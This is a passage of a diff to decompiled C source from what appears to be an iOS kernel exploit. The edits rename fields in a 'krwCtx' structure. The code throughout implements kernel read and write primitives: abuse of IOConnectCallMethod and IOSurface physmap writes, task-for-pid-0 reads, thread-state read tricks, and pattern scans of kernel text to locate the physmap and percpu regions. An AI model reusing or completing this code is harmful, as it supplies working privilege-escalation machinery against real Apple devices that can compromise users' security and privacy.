+  if ( !krwCtx->isSandboxed )
     return 1;
   v5 = 134217984;
 LABEL_16:
@@ -25887,9 +25887,9 @@ LABEL_42:
                   if ( validate_kaddr_range(krwCtx, v33) )
                   {
                     v8 = 0;
-                    krwCtx->gap_0x1944 = v7;
-                    *(__int128 *)krwCtx->raw_0x1948 = *(__int128 *)&v38.__sig;
-                    krwCtx->gap_0x1958 = v35;
+                    krwCtx->necpFd = v7;
+                    *(__int128 *)krwCtx->necpClientUuidAndState = *(__int128 *)&v38.__sig;
+                    krwCtx->necpClientKaddr = v35;
                   }
                   else
                   {
@@ -25947,14 +25947,14 @@ __int64 __fastcall teardown_krw_thread(struct_krwCtx *krwCtx)
       v3 = fd_open_dev_null(&v12);
       if ( !(uint32_t)v3 )
       {
-        v9 = krwCtx->gap_0x1944;
+        v9 = krwCtx->necpFd;
         if ( v9 != -1 )
         {
           close(v9);
-          krwCtx->gap_0x1944 = -1;
+          krwCtx->necpFd = -1;
         }
-        *(__int128 *)krwCtx->raw_0x1948 = 0u;
-        krwCtx->gap_0x1958 = 0;
+        *(__int128 *)krwCtx->necpClientUuidAndState = 0u;
+        krwCtx->necpClientKaddr = 0;
         v10 = v12;
         goto LABEL_21;
       }
@@ -26271,12 +26271,12 @@ __int64 __fastcall necp_semaphore_kread(struct_krwCtx *krwCtx, __int64 a2, char 
     {
       *(uint64_t *)old_state = a2;
       old_stateCnt[0] = a4;
-      if ( krwCtx->gap_0x1944 != -1 )
+      if ( krwCtx->necpFd != -1 )
       {
-        v21 = krwCtx->gap_0x1958;
-        if ( !uuid_is_null((const unsigned __int8 *)krwCtx->raw_0x1948) )
+        v21 = krwCtx->necpClientKaddr;
+        if ( !uuid_is_null((const unsigned __int8 *)krwCtx->necpClientUuidAndState) )
         {
-          if ( krwCtx->gap_0x1958 )
+          if ( krwCtx->necpClientKaddr )
           {
             v22 = krwCtx->xnuVersionPacked;
             v23 = 880;
@@ -26300,7 +26300,7 @@ __int64 __fastcall necp_semaphore_kread(struct_krwCtx *krwCtx, __int64 a2, char 
               LODWORD(v8) = 163856;
               if ( noppl_kwritebuf(krwCtx, v29, old_state, krwCtx->stride_0x168, 0) )
               {
-                if ( (unsigned int)necp_client_action(krwCtx->gap_0x1944, 3, krwCtx->raw_0x1948, 0x10, (void *)a3, a4) == a4 )
+                if ( (unsigned int)necp_client_action(krwCtx->necpFd, 3, krwCtx->necpClientUuidAndState, 0x10, (void *)a3, a4) == a4 )
                 {
                   LODWORD(v8) = 0;
                 }
@@ -26343,9 +26343,9 @@ __int64 __fastcall necp_semaphore_kread(struct_krwCtx *krwCtx, __int64 a2, char 
     v44 = 0;
     if ( a4 > 0x4000 || !krwCtx->gap_0x230 || !krwCtx->gap_0x228 )
       return v8;
-    if ( (unsigned int)(krwCtx->gap_0xE8 + 1) >= 2 && krwCtx->gap_0xF8 && krwCtx->gap_0x100 )
+    if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
     {
-      v33 = krwCtx->gap_0xF0;
+      v33 = krwCtx->ioConnectKernelValue;
       if ( !v33 )
       {
         v8 = 708617;
@@ -26695,11 +26695,11 @@ __int64 __fastcall teardown_semaphore_helper_ctx(struct_krwCtx *krwCtx, int a2)
   semaphore_t v7; // w1
   int v8; // w0
 
-  v2 = (void *)krwCtx->gap_0x28;
+  v2 = (void *)krwCtx->semaphoreHelperCtx;
   if ( v2 )
   {
     krwCtx->gap_0xC = 0;
-    krwCtx->gap_0x28 = 0;
+    krwCtx->semaphoreHelperCtx = 0;
     v3 = *(_opaque_pthread_t **)v2;
     if ( *(uint64_t *)v2 )
     {
@@ -26762,12 +26762,12 @@ __int64 __fastcall setup_iosurface_semaphore_helper(struct_krwCtx *krwCtx)
     }
     else
     {
-      if ( (unsigned int)(krwCtx->gap_0x10 + 1) <= 1 )
+      if ( (unsigned int)(krwCtx->iosurfaceObj + 1) <= 1 )
       {
         v7 = (unsigned int)ioservice_get_matching("AppleSEPManager");
         if ( v7 + 1 < 2 )
           return 708625;
-        krwCtx->gap_0x10 = v7;
+        krwCtx->iosurfaceObj = v7;
       }
       for ( i = 0; ; i = 1 )
       {
@@ -26796,7 +26796,7 @@ __int64 __fastcall setup_iosurface_semaphore_helper(struct_krwCtx *krwCtx)
         return 708617;
       v4 = v3;
       v3[4] = -1;
-      krwCtx->gap_0x28 = (uint64_t)v3;
+      krwCtx->semaphoreHelperCtx = (uint64_t)v3;
       v5 = semaphore_create(mach_task_self_, &semaphore[1], 0, 0);
       if ( !v5 )
       {
@@ -26876,11 +26876,11 @@ __int64 __fastcall kreadbuf_via_IOConnectCallMethod(
   uint64_t input[2]; // [xsp+48h] [xbp-68h] BYREF
 
   v5 = 708609;
-  if ( (unsigned int)(krwCtx->gap_0xE8 + 1) >= 2 )
+  if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 )
   {
-    if ( krwCtx->gap_0xF8 )
+    if ( krwCtx->ioConnectMappedAddr )
     {
-      if ( krwCtx->gap_0x100 )
+      if ( krwCtx->ioConnectMappedSize )
       {
         if ( check_kaddr_in_physmap(krwCtx, a2) )
         {
@@ -26904,26 +26904,26 @@ __int64 __fastcall kreadbuf_via_IOConnectCallMethod(
                 else
                   v19 = 0;
 LABEL_27:
-                v20 = krwCtx->gap_0xE8;
+                v20 = krwCtx->ioConnectPort;
                 v5 = 708609;
                 if ( v20 + 1 >= 2 )
                 {
                   v21 = v14 - v19;
-                  v22 = krwCtx->gap_0xF8;
+                  v22 = krwCtx->ioConnectMappedAddr;
                   v5 = 708609;
                   if ( krwCtx->xnuMajorVersion < 8792 )
                   {
                     if ( v22 )
                     {
                       v5 = 708609;
-                      if ( krwCtx->gap_0x100 )
+                      if ( krwCtx->ioConnectMappedSize )
                       {
-                        v28 = krwCtx->gap_0x108 + v22;
+                        v28 = krwCtx->ioConnectDataOffset + v22;
                         v29 = *(uint64_t *)(v28 + 192);
                         *(uint64_t *)(v28 + 192) = v21 - 20;
                         output[0] = 0;
                         LODWORD(outputStructCnt) = 1;
-                        input[0] = krwCtx->gap_0x110;
+                        input[0] = krwCtx->ioConnectDataSize;
                         v30 = IOConnectCallMethod(
                                 v20,
                                 0x10u,
@@ -26944,15 +26944,15 @@ LABEL_27:
                           v27 = 0;
                           v38 = output[0];
                         }
-                        v35 = krwCtx->gap_0xF8;
+                        v35 = krwCtx->ioConnectMappedAddr;
                         v32 = 708609;
                         if ( v35 )
                         {
                           v32 = 708609;
-                          if ( krwCtx->gap_0x100 )
+                          if ( krwCtx->ioConnectMappedSize )
                           {
                             v32 = 0;
-                            *(uint64_t *)(krwCtx->gap_0x108 + v35 + 192) = v29;
+                            *(uint64_t *)(krwCtx->ioConnectDataOffset + v35 + 192) = v29;
                           }
                         }
                         goto LABEL_53;
@@ -26962,9 +26962,9 @@ LABEL_27:
                   else if ( v22 )
                   {
                     v5 = 708609;
-                    if ( krwCtx->gap_0x100 )
+                    if ( krwCtx->ioConnectMappedSize )
                     {
-                      v23 = krwCtx->gap_0x108 + v22;
+                      v23 = krwCtx->ioConnectDataOffset + v22;
                       v24 = 1096;
                       if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8796, 100, 720, 1023, 1023) )
                         v24 = 1104;
@@ -26975,7 +26975,7 @@ LABEL_27:
                       outputStruct = 0;
                       outputCnt = 2;
                       outputStructCnt = 4;
-                      input[0] = krwCtx->gap_0x110;
+                      input[0] = krwCtx->ioConnectDataSize;
                       input[1] = 0;
                       output[0] = 0;
                       output[1] = 0;
@@ -26999,15 +26999,15 @@ LABEL_27:
                         v27 = 0;
                         v38 = outputStruct;
                       }
-                      v31 = krwCtx->gap_0xF8;
+                      v31 = krwCtx->ioConnectMappedAddr;
                       v32 = 708609;
                       if ( v31 )
                       {
                         v32 = 708609;
-                        if ( krwCtx->gap_0x100 )
+                        if ( krwCtx->ioConnectMappedSize )
                         {
                           v32 = 0;
-                          v33 = krwCtx->gap_0x108 + v31;
+                          v33 = krwCtx->ioConnectDataOffset + v31;
                           v34 = 1096;
                           if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8796, 100, 720, 1023, 1023) )
                             v34 = 1104;
@@ -27099,9 +27099,9 @@ __int64 __fastcall ioconnect_callmethod_write(struct_krwCtx *krwCtx, unsigned __
   uint64_t input[3]; // [xsp+20h] [xbp-70h] BYREF
 
   v5 = 708609;
-  if ( (unsigned int)(krwCtx->gap_0xE8 + 1) >= 2
-    && krwCtx->gap_0xF8
-    && krwCtx->gap_0x100
+  if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2
+    && krwCtx->ioConnectMappedAddr
+    && krwCtx->ioConnectMappedSize
     && check_kaddr_in_physmap(krwCtx, a2) )
   {
     v31 = -1;
@@ -27128,25 +27128,25 @@ __int64 __fastcall ioconnect_callmethod_write(struct_krwCtx *krwCtx, unsigned __
               break;
           }
           memcpy((char *)&v30 + v16, (const void *)(a3 + v13), v17);
-          v20 = krwCtx->gap_0xE8;
+          v20 = krwCtx->ioConnectPort;
           if ( v20 + 1 < 2 )
             goto LABEL_35;
-          v21 = krwCtx->gap_0xF8;
-          if ( !v21 || !krwCtx->gap_0x100 )
+          v21 = krwCtx->ioConnectMappedAddr;
+          if ( !v21 || !krwCtx->ioConnectMappedSize )
             goto LABEL_35;
           v22 = v30;
-          v23 = krwCtx->gap_0x108 + v21;
+          v23 = krwCtx->ioConnectDataOffset + v21;
           v24 = 864;
           if ( krwCtx->xnuMajorVersion > 8791 )
             v24 = 872;
           v25 = *(uint64_t *)(v23 + v24);
           *(uint64_t *)(v23 + v24) = v18;
-          input[0] = krwCtx->gap_0x110;
+          input[0] = krwCtx->ioConnectDataSize;
           input[1] = 0;
           input[2] = v22;
           v26 = IOConnectCallMethod(v20, 0x21u, input, 3u, 0, 0, 0, 0, 0, 0);
-          v27 = krwCtx->gap_0xF8;
-          if ( !v27 || !krwCtx->gap_0x100 )
+          v27 = krwCtx->ioConnectMappedAddr;
+          if ( !v27 || !krwCtx->ioConnectMappedSize )
           {
             if ( !v26 )
               goto LABEL_35;
@@ -27154,7 +27154,7 @@ LABEL_33:
             v5 = v26 | 0x80000000;
             goto LABEL_35;
           }
-          v28 = krwCtx->gap_0x108 + v27;
+          v28 = krwCtx->ioConnectDataOffset + v27;
           v29 = 864;
           if ( krwCtx->xnuMajorVersion > 8791 )
             v29 = 872;
@@ -27246,12 +27246,12 @@ __int64 __fastcall setup_physmap_krw(struct_krwCtx *krwCtx, char a2)
   uint64_t physmapEndKaddr; // [xsp+8h] [xbp-88h] BYREF
   uint64_t percpuGlobalValue;
 
-  if ( !krwCtx->gap_0x80 || !krwCtx->gap_0x88 )
+  if ( !krwCtx->physmapBasePhys || !krwCtx->physmapSize )
   {
     if ( (a2 & 1) != 0 )
       return ERR_BAD_INPUT;
 
-    macho_find_text_section(krwCtx->gap_0x19F8, &textRange.field_0x00);
+    macho_find_text_section(krwCtx->kernelMachoCtx, &textRange.field_0x00);
     textRange.base_ptr += textRange.size - 0x20000;
     textRange.size = 0x20000;
     scanRange = textRange;
@@ -27264,12 +27264,12 @@ __int64 __fastcall setup_physmap_krw(struct_krwCtx *krwCtx, char a2)
     uint64_t secondGlobalRef = 0;
     for ( int64_t off = -4; off < 0xFC; off += 4 )
     {
-      uint32_t adrpInsn = macho_read_u32(krwCtx->gap_0x19F8, (__int64 *)(patternHit + off + 4));
-      uint32_t ldrInsn = macho_read_u32(krwCtx->gap_0x19F8, (__int64 *)(patternHit + off + 8));
+      uint32_t adrpInsn = macho_read_u32(krwCtx->kernelMachoCtx, (__int64 *)(patternHit + off + 4));
+      uint32_t ldrInsn = macho_read_u32(krwCtx->kernelMachoCtx, (__int64 *)(patternHit + off + 8));
       if ( (adrpInsn & 0x9F000000) != 0x90000000 || (ldrInsn & 0xBFC00000) != 0xB9400000 )
         continue;
 
-      uint64_t globalRef = find_kernel_func(krwCtx->gap_0x19F8, (__int64 *)(patternHit + off + 4));
+      uint64_t globalRef = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(patternHit + off + 4));
       if ( !globalRef )
         return ERR_NOT_FOUND;
       if ( firstGlobalRef )
@@ -27296,22 +27296,22 @@ __int64 __fastcall setup_physmap_krw(struct_krwCtx *krwCtx, char a2)
     if ( !physmapBasePhys )
       return ERR_INVALID_KADDR;
 
-    krwCtx->gap_0x80 = physmapBasePhys;
-    krwCtx->gap_0x88 = (uint32_t)(physmapEndKaddr - physmapBaseKaddr);
+    krwCtx->physmapBasePhys = physmapBasePhys;
+    krwCtx->physmapSize = (uint32_t)(physmapEndKaddr - physmapBaseKaddr);
   }
 
-  if ( krwCtx->gap_0xA0 && krwCtx->gap_0xA8_size4 )
+  if ( krwCtx->percpuBasePhys && krwCtx->percpuSize )
     return 0;
   if ( (a2 & 1) != 0 )
     return ERR_BAD_INPUT;
 
-  macho_getsectbyname("__DATA", krwCtx->gap_0x19F8, "__percpu", &textRange.field_0x00);
+  macho_getsectbyname("__DATA", krwCtx->kernelMachoCtx, "__percpu", &textRange.field_0x00);
   uint64_t percpuBase = textRange.base_ptr;
   uint32_t percpuSize = (uint32_t)textRange.size;
   if ( !percpuBase || !percpuSize )
     return ERR_NOT_FOUND;
 
-  macho_find_text_section(krwCtx->gap_0x19F8, &textRange.field_0x00);
+  macho_find_text_section(krwCtx->kernelMachoCtx, &textRange.field_0x00);
   if ( !textRange.base_ptr || !textRange.size )
     return ERR_NOT_FOUND;
   textRange.base_ptr += textRange.size - 0x20000;
@@ -27320,7 +27320,7 @@ __int64 __fastcall setup_physmap_krw(struct_krwCtx *krwCtx, char a2)
   uint64_t percpuPattern = kernel_pattern_scan(&textRange, ".. 02 00 F9 E1 03 13 AA", 0);
   if ( !percpuPattern )
     return ERR_NOT_FOUND;
-  uint64_t percpuGlobalRef = find_kernel_func_by_branch(krwCtx->gap_0x19F8, (__int64 *)(percpuPattern - 8), 0);
+  uint64_t percpuGlobalRef = find_kernel_func_by_branch(krwCtx->kernelMachoCtx, (__int64 *)(percpuPattern - 8), 0);
   if ( !percpuGlobalRef )
     return ERR_BAD_BRANCH;
 
@@ -27336,8 +27336,8 @@ __int64 __fastcall setup_physmap_krw(struct_krwCtx *krwCtx, char a2)
     return ERR_INVALID_KADDR;
 
   uint32_t pageMask = krwCtx->pageMask;
-  krwCtx->gap_0xA0 = percpuPhys;
-  krwCtx->gap_0xA8_size4 = (pageMask + percpuSize) & ~pageMask;
+  krwCtx->percpuBasePhys = percpuPhys;
+  krwCtx->percpuSize = (pageMask + percpuSize) & ~pageMask;
   return 0;
 }
 
@@ -27573,9 +27573,9 @@ LABEL_76:
 LABEL_66:
   v29 = number_of_cpus();
   v30 = (unsigned int)(v29 - 1);
-  v31 = krwCtx->gap_0xA0;
+  v31 = krwCtx->percpuBasePhys;
   v83 = 0;
-  v32 = (unsigned int)(krwCtx->gap_0xA8_size4 * v30);
+  v32 = (unsigned int)(krwCtx->percpuSize * v30);
   v33 = map_physpage_with_mem_entry(krwCtx, (vm_address_t *)&v83, v32, v31);
   if ( (uint32_t)v33 )
   {
@@ -27601,7 +27601,7 @@ LABEL_142:
   {
     v36 = 0;
     v37 = (char *)v83 + v21;
-    v38 = krwCtx->gap_0xA8_size4;
+    v38 = krwCtx->percpuSize;
     do
     {
       v39 = &v37[v36];
@@ -27876,12 +27876,12 @@ LABEL_155:
   }
   v6 = 0;
   krwCtx->threadForKernelRead = v23;
-  krwCtx->gap_0xB0 = address;
-  krwCtx->gap_0xB8 = v4;
-  krwCtx->gap_0xC0 = krwCtx->pageMask & v26;
-  krwCtx->gap_0xC8 = (uint64_t)v78;
-  krwCtx->gap_0xD0 = v27;
-  krwCtx->gap_0xD8 = v26;
+  krwCtx->threadStateMapAddr = address;
+  krwCtx->threadStateMapSize = v4;
+  krwCtx->threadStatePageOffset = krwCtx->pageMask & v26;
+  krwCtx->threadStateMappedPtr = (uint64_t)v78;
+  krwCtx->threadStateScratchKaddr = v27;
+  krwCtx->threadStateKrwPhysAddr = v26;
   return v6;
 }
 // 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);
@@ -28420,7 +28420,7 @@ LABEL_29:
       v3 = init_pgtable_walk_ctx(krwCtx, 0);
       if ( !(uint32_t)v3 )
       {
-        v23 = krwCtx->gap_0x19F8;
+        v23 = krwCtx->kernelMachoCtx;
         v3 = 708609;
         if ( v23 )
         {
@@ -28532,11 +28532,11 @@ bool __fastcall noppl_kwrite32(struct_krwCtx *krwCtx, mach_vm_address_t address,
     v6 = v5(krwCtx, address, &v10, 4, 1);
     goto LABEL_3;
   }
-  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->gap_0xD8 )
+  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
   {
     v6 = iosurface_physmap_kwrite(krwCtx, address, (__int64)&v10, 4u, 1);
   }
-  else if ( (unsigned int)(krwCtx->gap_0xE8 + 1) >= 2 && krwCtx->gap_0xF8 && krwCtx->gap_0x100 )
+  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
   {
     v6 = ioconnect_callmethod_write(krwCtx, address, (__int64)&v10, 4u, 1);
   }
@@ -28653,13 +28653,13 @@ __int64 __fastcall iosurface_physmap_kwrite(struct_krwCtx *krwCtx, unsigned __in
               krwCtx->flags,
               *(unsigned __int8 *)(IOKitConnInfo + 74),
               krwCtx->threadForKernelRead,
-              (unsigned long long)*(uint64_t *)&krwCtx->gap_0xD8);
+              (unsigned long long)*(uint64_t *)&krwCtx->threadStateKrwPhysAddr);
   v8 = a4;
   if ( ((a2 & 3) != 0 || a4 != 4) && *(uint8_t *)(IOKitConnInfo + 74) )
   {
     if ( krwCtx->threadForKernelRead + 1 >= 2 )
     {
-      if ( *(uint64_t *)&krwCtx->gap_0xD8 )
+      if ( *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
       {
         if ( check_kaddr_in_physmap(krwCtx, a2) )
         {
@@ -29015,11 +29015,11 @@ bool __fastcall kread_u32(struct_krwCtx *krwCtx, unsigned __int64 vaddr, void *o
     v4 = v3(krwCtx, vaddr, outBuf, 4, 1);
     goto LABEL_3;
   }
-  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->gap_0xD8 )
+  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
   {
     v4 = kreadbuf_via_dev_null_and_thread_state(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
   }
-  else if ( (unsigned int)(krwCtx->gap_0xE8 + 1) >= 2 && krwCtx->gap_0xF8 && krwCtx->gap_0x100 )
+  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
   {
     v4 = kreadbuf_via_IOConnectCallMethod(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
   }
@@ -29039,7 +29039,7 @@ LABEL_22:
              krwCtx->targetVmPort,
              vaddr,
              4u,
-             krwCtx->gap_0x178,
+             krwCtx->vmMapSize,
              (__int64)outBuf,
              &v7);
       return v5 == 0;
@@ -29107,7 +29107,7 @@ __int64 __fastcall kreadbuf_via_dev_null_and_thread_state(
   v5 = 0xAD001;
   if ( krwCtx->threadForKernelRead + 1 >= 2 )
   {
-    if ( *(uint64_t *)&krwCtx->gap_0xD8 )
+    if ( *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
     {
       vaddr_ = vaddr;
       if ( check_kaddr_in_physmap(krwCtx, vaddr) )
@@ -29151,7 +29151,7 @@ LABEL_68:
                 *(uint64_t *)v18 = 528;
               else
                 *(uint64_t *)v18 = sizeMinusI;
-              if ( krwCtx->threadForKernelRead + 1 < 2 || !*(uint64_t *)&krwCtx->gap_0xD8 )
+              if ( krwCtx->threadForKernelRead + 1 < 2 || !*(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
               {
                 v5 = 708609;
                 goto LABEL_72;
@@ -29182,21 +29182,21 @@ LABEL_69:
                   v32 = (unsigned int)krwCtx->pageSizeOrSomething - 528LL;
                 else
                   v32 = pageMask & v22;
-                if ( validate_kaddr_range(krwCtx, *(uint64_t *)&krwCtx->gap_0xE0) )
+                if ( validate_kaddr_range(krwCtx, *(uint64_t *)&krwCtx->threadStateSavedPtr) )
                 {
-                  *(uint64_t *)old_stateCnt = *(uint64_t *)&krwCtx->gap_0xE0;
+                  *(uint64_t *)old_stateCnt = *(uint64_t *)&krwCtx->threadStateSavedPtr;
                   goto LABEL_45;
                 }
-                v37 = read_via_mapped_physmem_region(krwCtx, *(uint64_t *)&krwCtx->gap_0xD8, old_stateCnt, 8u, 0);
+                v37 = read_via_mapped_physmem_region(krwCtx, *(uint64_t *)&krwCtx->threadStateKrwPhysAddr, old_stateCnt, 8u, 0);
                 v5 = v37;
                 if ( !(uint32_t)v37 )
                 {
-                  *(uint64_t *)&krwCtx->gap_0xE0 = *(uint64_t *)old_stateCnt;
+                  *(uint64_t *)&krwCtx->threadStateSavedPtr = *(uint64_t *)old_stateCnt;
 LABEL_45:
                   v33 = v32 + (v22 & ~pageMask);
                   __dsb(0xBu);
                   v49 = v33 - 16;
-                  v34 = physwritebuf_direct_mapped(krwCtx, *(uint64_t *)&krwCtx->gap_0xD8, &v49, 8u, 0);
+                  v34 = physwritebuf_direct_mapped(krwCtx, *(uint64_t *)&krwCtx->threadStateKrwPhysAddr, &v49, 8u, 0);
                   v5 = v34;
                   if ( !(uint32_t)v34 )
                   {
@@ -29218,7 +29218,7 @@ LABEL_45:
                     {
                       v36 = 708642;
                     }
-                    v38 = physwritebuf_direct_mapped(krwCtx, *(uint64_t *)&krwCtx->gap_0xD8, old_stateCnt, 8u, 0);
+                    v38 = physwritebuf_direct_mapped(krwCtx, *(uint64_t *)&krwCtx->threadStateKrwPhysAddr, old_stateCnt, 8u, 0);
                     if ( v36 )
                       v39 = v36;
                     else
@@ -29239,9 +29239,9 @@ LABEL_45:
                 if ( v27 >= (unsigned __int64)(unsigned int)krwCtx->pageSizeOrSomething - 528 )
                   v27 = (unsigned int)krwCtx->pageSizeOrSomething - 528LL;
                 v28 = v27 + v26;
-                v29 = **(uint64_t **)&krwCtx->gap_0xC8;
+                v29 = **(uint64_t **)&krwCtx->threadStateMappedPtr;
                 __dsb(0xBu);
-                **(uint64_t **)&krwCtx->gap_0xC8 = v27 + v26 - 16;
+                **(uint64_t **)&krwCtx->threadStateMappedPtr = v27 + v26 - 16;
                 v30 = thread_get_state(krwCtx->threadForKernelRead, 17, old_state, old_stateCnt);
                 if ( v30 )
                 {
@@ -29260,7 +29260,7 @@ LABEL_45:
                 {
                   v5 = 708642;
                 }
-                **(uint64_t **)&krwCtx->gap_0xC8 = v29;
+                **(uint64_t **)&krwCtx->threadStateMappedPtr = v29;
               }
               if ( !(uint32_t)v5 )
               {
@@ -29349,11 +29349,11 @@ bool __fastcall kread64_internal(struct_krwCtx *krwCtx, unsigned __int64 a2, uin
     v4 = v3(krwCtx, a2, a3, (unsigned int)krwCtx->stride_0x168, 1);
     goto LABEL_3;
   }
-  if ( krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->gap_0xD8 )
+  if ( krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
   {
     v4 = kreadbuf_via_dev_null_and_thread_state(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
   }
-  else if ( (unsigned int)(*(uint32_t *)&krwCtx->gap_0xE8 + 1) >= 2 && *(uint64_t *)&krwCtx->gap_0xF8 && *(uint64_t *)&krwCtx->gap_0x100 )
+  else if ( (unsigned int)(*(uint32_t *)&krwCtx->ioConnectPort + 1) >= 2 && *(uint64_t *)&krwCtx->ioConnectMappedAddr && *(uint64_t *)&krwCtx->ioConnectMappedSize )
   {
     v4 = kreadbuf_via_IOConnectCallMethod(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
   }
@@ -29369,7 +29369,7 @@ bool __fastcall kread64_internal(struct_krwCtx *krwCtx, unsigned __int64 a2, uin
     if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
     {
 LABEL_22:
-      v5 = kreadbuf_via_tfp0(krwCtx->targetAndParentTaskPorts, a2, krwCtx->stride_0x168, (unsigned int)krwCtx->gap_0x178, (__int64)a3, &v7);
+      v5 = kreadbuf_via_tfp0(krwCtx->targetAndParentTaskPorts, a2, krwCtx->stride_0x168, (unsigned int)krwCtx->vmMapSize, (__int64)a3, &v7);
       return v5 == 0;
     }
     v4 = kreadbuf_via_dev_null_simple(krwCtx, a2, a3, krwCtx->stride_0x168, 1);
@@ -29449,7 +29449,7 @@ bool __fastcall this_is_the_kwrite64(struct_krwCtx *krwCtx, mach_vm_address_t ad
     v7 = v6(krwCtx, address, &v22, krwCtx->stride_0x168, 1);
     goto LABEL_3;
   }
-  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->gap_0xD8 )
+  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
   {
     *(uint64_t *)value = newValue;
     if ( !krwCtx->IOKitConnInfo )
@@ -29460,7 +29460,7 @@ bool __fastcall this_is_the_kwrite64(struct_krwCtx *krwCtx, mach_vm_address_t ad
     v7 = iosurface_physmap_kwrite(krwCtx, address, (__int64)value, krwCtx->stride_0x168, 1);
     goto LABEL_3;
   }
-  if ( (unsigned int)(krwCtx->gap_0xE8 + 1) >= 2 && krwCtx->gap_0xF8 && krwCtx->gap_0x100 )
+  if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
   {
     v7 = ioconnect_callmethod_write(krwCtx, address, (__int64)&v22, krwCtx->stride_0x168, 1);
     goto LABEL_3;
@@ -29494,7 +29494,7 @@ LABEL_27:
       goto LABEL_32;
     }
     *(uint64_t *)value = newValue;
-    v10 = krwCtx->gap_0x28;
+    v10 = krwCtx->semaphoreHelperCtx;
     if ( !v10 || (v11 = *(uint32_t *)(v10 + 8), v11 + 1 < 2) )
     {
       v12 = 708609;
@@ -29736,13 +29736,13 @@ bool __fastcall kreadbuf_universal(struct_krwCtx *krwCtx, unsigned __int64 vaddr
     v6 = v5(krwCtx, vaddr, outBuf, size, a5);
     goto LABEL_3;
   }
-  if ( krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->gap_0xD8 )
+  if ( krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
   {
     v6 = kreadbuf_via_dev_null_and_thread_state(krwCtx, vaddr, (__int64)outBuf, size, a5);
   }
-  else if ( (unsigned int)(*(uint32_t *)&krwCtx->gap_0xE8 + 1) >= 2
-         && *(uint64_t *)&krwCtx->gap_0xF8
-         && *(uint64_t *)&krwCtx->gap_0x100 )
+  else if ( (unsigned int)(*(uint32_t *)&krwCtx->ioConnectPort + 1) >= 2
+         && *(uint64_t *)&krwCtx->ioConnectMappedAddr
+         && *(uint64_t *)&krwCtx->ioConnectMappedSize )
   {
     v6 = kreadbuf_via_IOConnectCallMethod(krwCtx, vaddr, (__int64)outBuf, size, a5);
   }
@@ -29758,7 +29758,7 @@ bool __fastcall kreadbuf_universal(struct_krwCtx *krwCtx, unsigned __int64 vaddr
     if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
     {
 LABEL_22:
-      v7 = kreadbuf_via_tfp0(krwCtx->targetAndParentTaskPorts, vaddr, size, (unsigned int)krwCtx->gap_0x178, (__int64)outBuf, 0);
+      v7 = kreadbuf_via_tfp0(krwCtx->targetAndParentTaskPorts, vaddr, size, (unsigned int)krwCtx->vmMapSize, (__int64)outBuf, 0);
       return v7 == 0;
     }
     v6 = kreadbuf_via_dev_null_simple(krwCtx, vaddr, outBuf, size, a5);
@@ -29793,10 +29793,10 @@ bool __fastcall noppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 a2, cons
               a5,
               (unsigned long long)krwCtx->iogpuKwriteFn,
               krwCtx->threadForKernelRead,
-              (unsigned long long)krwCtx->gap_0xD8,
-              krwCtx->gap_0xE8,
-              (unsigned long long)krwCtx->gap_0xF8,
-              (unsigned long long)krwCtx->gap_0x100,
+              (unsigned long long)krwCtx->threadStateKrwPhysAddr,
+              krwCtx->ioConnectPort,
+              (unsigned long long)krwCtx->ioConnectMappedAddr,
+              (unsigned long long)krwCtx->ioConnectMappedSize,
               krwCtx->krw_pipe_0,
               krwCtx->krw_pipe_1,
               krwCtx->pipeFd0,
@@ -29804,7 +29804,7 @@ bool __fastcall noppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 a2, cons
               krwCtx->iosurfaceFd_size4,
               (unsigned long long)krwCtx->gap_0x218,
               krwCtx->targetVmPort,
-              krwCtx->gap_0x178_size4);
+              krwCtx->vmMapSize_size4);
   v5 = (__int64 (__fastcall *)(__int64, unsigned __int64, const void *, mach_vm_size_t, int))krwCtx->iogpuKwriteFn;
   if ( v5 )
   {
@@ -29812,12 +29812,12 @@ bool __fastcall noppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 a2, cons
     TRACE_PORTS("noppl_kwritebuf backend=custom raw=%x\n", v6);
     goto LABEL_3;
   }
-  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->gap_0xD8 )
